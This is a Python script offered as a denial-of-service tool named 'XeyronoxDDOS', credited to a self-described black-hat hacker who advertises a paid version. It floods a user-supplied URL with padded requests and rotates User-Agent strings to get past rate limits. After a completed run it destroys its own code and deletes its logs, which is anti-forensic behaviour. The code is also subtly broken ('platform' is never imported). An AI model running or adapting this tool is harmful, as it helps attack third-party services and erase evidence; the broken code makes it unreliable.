import time
import random
import requests
import sys
import os
from datetime import datetime, timedelta
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich.prompt import Prompt, IntPrompt
from cryptography.fernet import Fernet
import logging

# XeyronoxDDOS for educational and basic features only
# Tool Name: XeyronoxDDOS (Free Version, v1.0)
# Developer: xeyronox (Red/Black Hat Hacker)
# Contact: Instagram @xeyronox
# Note: This is a free version with basic features only. No upgrades available in free version.
# For paid version (v1.2 or higher), contact Instagram @xeyronox.

console = Console()

# Setup logging
logging.basicConfig(filename='traffic_sim.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Random User-Agent for CTF rate-limiting bypass simulation
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G960F) Chrome/91.0.4472.114 Mobile"
]

def display_menu():
    table = Table(title="XeyronoxDDOS (Free Version, v1.0)")
    table.add_column("Option", style="cyan")
    table.add_column("Description", style="green")
    table.add_row("1", "Low traffic (1 req/sec, small payload)")
    table.add_row("2", "Medium traffic (5 req/sec, medium payload)")
    table.add_row("3", "High traffic (10 req/sec, large payload)")
    table.add_row("4", "Exit")
    console.print(table)
    console.print("Developer: xeyronox (Red/Black Hat Hacker) | Contact: Instagram @xeyronox")
    console.print("[yellow]Free version (v1.0) with basic features only. For paid version (v1.2+), contact @xeyronox on Instagram.[/]")
    return IntPrompt.ask("Enter choice", choices=["1", "2", "3", "4"], default=1)

def simulate_traffic(target_url, duration_minutes=30, request_rate=1, payload_size="small"):
    start_time = datetime.now()
    end_time = start_time + timedelta(minutes=duration_minutes)
    payload_sizes = {"small": 100, "medium": 1000, "large": 5000}
    payload = "x" * payload_sizes[payload_size]  # Simulate payload size
    headers = {"User-Agent": random.choice(user_agents)}
    
    console.print(f"[bold green]Starting XeyronoxDDOS simulation to {target_url} for {duration_minutes} minutes...[/]")
    logging.info(f"Simulation started: {target_url}, Rate: {request_rate}/sec, Payload: {payload_size}")
    
    with Progress() as progress:
        task = progress.add_task("[cyan]Simulating traffic...", total=duration_minutes * 60)
        try:
            while datetime.now() < end_time:
                try:
                    response = requests.get(target_url, headers=headers, data=payload, timeout=5)
                    console.print(f"[yellow]Sent request to {target_url}, Status: {response.status_code}[/]")
                    logging.info(f"Request sent, Status: {response.status_code}")
                except requests.RequestException as e:
                    console.print(f"[red]Request failed: {e}[/]")
                    logging.error(f"Request failed: {e}")
                
                time.sleep(1.0 / request_rate)
                progress.update(task, advance=1.0 / request_rate)
                
        except KeyboardInterrupt:
            console.print("[red]Simulation stopped by user.[/]")
            logging.info("Simulation stopped by user")
            with open("last_run.txt", "w") as f:
                f.write(str(datetime.now()))
            return False
    
    console.print("[bold green]Simulation completed.[/]")
    logging.info("Simulation completed")
    return True

def self_destruct():
    console.print("[red]Initiating XeyronoxDDOS self-destruct sequence...[/]")
    # Generate encryption key (not saved, so file is unrecoverable)
    key = Fernet.generate_key()
    fernet = Fernet(key)
    with open(__file__, "rb") as f:
        file_data = f.read()
    # Encrypt and corrupt file
    encrypted_data = fernet.encrypt(file_data)
    with open(__file__, "wb") as f:
        f.write(encrypted_data[:len(encrypted_data)//2] + b"#CORRUPTED")
    # Delete log and run tracking files
    for file in ["traffic_sim.log", "last_run.txt"]:
        if os.path.exists(file):
            os.remove(file)
    console.print("[red]Script corrupted and logs deleted. Unrecoverable.[/]")
    sys.exit(0)

def main():
    target_url = Prompt.ask("Enter CTF target URL", default="http://127.0.0.1:8080")
    max_duration = 30  # 30 minutes max runtime
    
    # Check previous run
    try:
        with open("last_run.txt", "r") as f:
            last_run = f.read()
            console.print(f"[yellow]Previous run stopped at: {last_run}[/]")
    except FileNotFoundError:
        pass
    
    # Menu selection
    while True:
        choice = display_menu()
        if choice == 1:
            request_rate, payload_size = 1, "small"
            break
        elif choice == 2:
            request_rate, payload_size = 5, "medium"
            break
        elif choice == 3:
            request_rate, payload_size = 10, "large"
            break
        elif choice == 4:
            console.print("[red]Exiting XeyronoxDDOS.[/]")
            sys.exit(0)
        else:
            console.print("[red]Invalid choice.[/]")
    
    # Run simulation
    success = simulate_traffic(target_url, max_duration, request_rate, payload_size)
    
    # Save stop time
    if not success:
        with open("last_run.txt", "w") as f:
            f.write(str(datetime.now()))
    
    # Self-destruct
    if success:
        self_destruct()

if __name__ == "__main__":
    if platform.system() == "Emscripten":
        import asyncio
        asyncio.ensure_future(main())
    else:
        main()
